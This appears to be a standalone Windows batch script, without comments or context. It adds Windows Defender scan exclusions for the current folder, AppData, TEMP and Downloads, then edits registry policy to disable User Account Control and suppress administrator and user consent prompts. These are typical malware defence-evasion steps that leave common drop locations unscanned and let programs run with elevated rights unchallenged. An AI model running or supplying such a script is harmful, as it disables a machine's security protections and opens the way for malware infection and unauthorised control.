@echo off
powershell -Command "Add-MpPreference -ExclusionPath '%CD%'"
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData'"
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Downloads'"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorUser /t REG_DWORD /d 0 /f